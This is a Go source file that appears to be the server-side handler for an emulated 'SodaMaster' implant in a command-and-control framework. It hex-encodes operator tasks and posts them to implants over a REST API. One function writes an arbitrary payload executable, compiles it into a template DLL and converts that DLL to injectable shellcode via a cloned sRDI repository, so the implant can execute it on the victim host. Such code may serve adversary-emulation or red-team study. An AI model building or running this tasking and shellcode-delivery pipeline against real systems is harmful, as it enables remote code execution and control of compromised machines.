package sodamaster

import (
    "bytes"
    "encoding/base64"
    "encoding/hex"
    "errors"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "os/exec"
    "strconv"
    "strings"
)

const (
    sRDIpath     = "/opt/sRDI"
    templatePath = "./handlers/sodamaster/template"
    buildPath    = "./handlers/sodamaster/template/build"
    dllPath      = templatePath + "/bin/libtemplate.dll"
)

// intToHex takes an integer and converts it to a one byte hex string
//
//	dec: integer value to be converted, must be between 0-255
//
// returns the string representation of the integer in hex
func intToHex(dec int) string {
    hexString := fmt.Sprintf("%02x", dec)
    return hexString
}

// multipleIntsToHex converts each single int to a hex byte
//
//	dec: integer value to be converted, must be between 0-2147483647
//
// returns a hex string representing an integer (ie. input of 123 would return 010203)
func multipleIntsToHex(dec int32) string {
    intString := fmt.Sprintf("%d", dec)
    hexString := ""
    for _, char := range intString {
        charInt, _ := strconv.Atoi(string(char))
        hexString += intToHex(charInt)
    }
    return hexString
}

// getDataLenLength calculates the length of the data length
//
//	dataLen: the length of the task arguments/relevant data
//
// returns an integer representing the length of the data length (ie. a length of 15 would have length of length 2)
func getDataLenLength(dataLen int32) int {
    stringLen := fmt.Sprintf("%d", dataLen)
    return len(stringLen)
}

// decodeHex decodes a hex string received from the implant
//
// splitData: the string array containing one byte hex values
//
// returns the length of the data length, the data length, and the decoded data
func decodeHex(splitData []string) (int64, int32, string, error) {
    lenOfLength, _ := strconv.ParseInt(splitData[1], 16, 64)

    //Bounds checking to ensure the handler won't crash if data is invalid
    if (lenOfLength + 2) > int64(len(splitData)) {
        return lenOfLength, 0, "", errors.New("Failed to decode hex: Data lengths invalid.")
    }

    hexLen := strings.Join(splitData[2:lenOfLength+2], "")
    intString := ""
    for i, elem := range hexLen {
        if i%2 != 0 {
            intString += string(elem)
        }
    }
    dataLen, _ := strconv.ParseInt(intString, 10, 32)

    //Bounds checking to ensure the handler won't crash if data is invalid
    if (dataLen + lenOfLength + 2) > int64(len(splitData)) {
        return lenOfLength, int32(dataLen), "", errors.New("Failed to decode hex: Data lengths invalid.")
    }

    hexData := strings.Join(splitData[lenOfLength+2:dataLen+lenOfLength+2], "")
    decodedHex, _ := hex.DecodeString(hexData)
    return lenOfLength, int32(dataLen), string(decodedHex), nil
}

// ********************************************************************************
//
// TASKING HELPER FUNCTIONS
//
// ********************************************************************************

// formatTasks takes the relevant task information and converts the data to a hex string
//
//	id: the id of the task, dataLen: the length of the task commands, data: the task commands or data passed in by the operator
//
// returns the task string in hex
func formatTask(id string, dataLen int32, data string) string {
    taskString := hex.EncodeToString([]byte(id))
    if dataLen > 0 {
        taskString += intToHex(getDataLenLength(dataLen)) + multipleIntsToHex(dataLen) + hex.EncodeToString([]byte(data))
    }
    return taskString
}

// formatTasks takes the shellcode execution task instructions and formats it into a hex string to send to the implant
//
//	id: the id of the task, dataLen: the length of the task commands, shellcode: the shellcode bytes that the implant will inject
//
// returns the task string in hex
func formatShellcodeTask(id string, shellcode []byte) string {
    taskString := hex.EncodeToString([]byte(id))
    b64Shellcode := base64.StdEncoding.EncodeToString(shellcode)
    b64ShellcodeLen := int32(len(b64Shellcode))
    if b64ShellcodeLen > 0 {
        taskString += intToHex(getDataLenLength(b64ShellcodeLen)) + multipleIntsToHex(b64ShellcodeLen) + hex.EncodeToString([]byte(b64Shellcode))
    }
    return taskString
}

// setTask sets a task for the specified implant on the restAPI
//
//	task: the task string for the implant, uuid: the uuid of the implant, restAPIBaseURL: the base URL address of the restAPI
//
// returns the restAPI response or an error
func setTask(task string, uuid string, restAPIBaseURL string) (string, error) {
    url := restAPIBaseURL + "session/" + uuid + "/task"

    // setup HTTP POST request
    request, err := http.NewRequest("POST", url, bytes.NewBufferString(task))
    if err != nil {
        return "", err
    }

    // execute HTTP POST and read response
    client := &http.Client{}
    response, err := client.Do(request)
    if err != nil {
        return "", err
    }

    defer response.Body.Close()
    if response.StatusCode != 200 {
        return "", fmt.Errorf("Expected error code 200, got %v", response.StatusCode)
    }
    body, err := ioutil.ReadAll(response.Body)
    return string(body[:]), err
}

// prepExecutionTask rewrites the payload at bin\payload.exe, compiles the template with the new payload, and converts the dll to shellcode to send to the implant
//
//	task: the Task struct pulled from the REST API with the relevant payload info and cli args
//
// returns the template binary in shellcode bytes
func prepExecutionTask(task *Task) ([]byte, error) {
    //Rewrite the payload in /bin with the payload bytes
    if task.lenPayload > 0 {
        f, err := os.Create("./handlers/sodamaster/template/bin/payload.exe")
        if err != nil {
            return nil, errors.New(fmt.Sprintf("Failed to open bin/payload.exe: %s", err.Error()))
        }
        bytesWritten, err := f.Write(task.payloadData)
        if task.lenPayload != int32(bytesWritten) {
            return nil, errors.New(fmt.Sprintf("Failed to write payload bytes to bin. Bytes written: %d, bytes expected: %d", bytesWritten, task.lenPayload))
        }
    }

    //Build the cmake command string
    payloadPath, payloadName, args := "", "", ""
    if len(task.payloadPath) > 0 {
        payloadPath = "-DPAYLOAD_PATH=" + task.payloadPath
    }
    if len(task.payloadName) > 0 {
        payloadName = "-DPAYLOAD_NAME=" + task.payloadName
    }
    if task.lenArgs > 0 {
        args = "-DARGS=" + task.args
    }

    //Compile the binary
    var stderr bytes.Buffer
    cmd := exec.Command("cmake", templatePath, ("-B " + buildPath), payloadPath, payloadName, args, "--fresh")
    cmd.Stderr = &stderr
    if cmd.Run() != nil {
        return nil, errors.New(fmt.Sprintf("Failed to spawn cmake process, stderr: %s", stderr.String()))
    }

    cmd = exec.Command("cmake", "--build", buildPath)
    cmd.Stderr = &stderr
    if cmd.Run() != nil {
        return nil, errors.New(fmt.Sprintf("Failed to spawn cmake process, stderr: %s", stderr.String()))
    }

    //Clone the sRDI repo if it does not already exist and check it out to the correct commit
    if _, err := os.Open(sRDIpath); os.IsNotExist(err) {
        cmd = exec.Command("git", "clone", "https://github.com/monoxgas/sRDI.git", sRDIpath)
        cmd.Stderr = &stderr
        if cmd.Run() != nil {
            return nil, errors.New(fmt.Sprintf("Failed to clone the sRDI repo: %s", stderr.String()))
        }

        cmd = exec.Command("git", "-C", sRDIpath, "checkout", "5690685aee6751d0dbcf2c50b6fdd4427c1c9a0a")
        cmd.Stderr = &stderr
        if cmd.Run() != nil {
            return nil, errors.New(fmt.Sprintf("Failed to checkout repo to correct commit: %s", stderr.String()))
        }
    }

    //Convert the dll to shellcode and read the bytes into data buffer
    cmd = exec.Command("python3", (sRDIpath + "/Python/ConvertToShellcode.py"), dllPath, "-f", "Run", "-of", "raw")
    cmd.Stderr = &stderr
    if cmd.Run() != nil {
        return nil, errors.New(fmt.Sprintf("Failed to convert the dll to shellcode: %s", stderr.String()))
    }

    shellCode, err := os.ReadFile(templatePath + "/bin/libtemplate.bin")
    if err != nil {
        return nil, errors.New(fmt.Sprintf("Failed to get shellcode bytes: %s", err.Error()))
    }

    return shellCode, nil
}
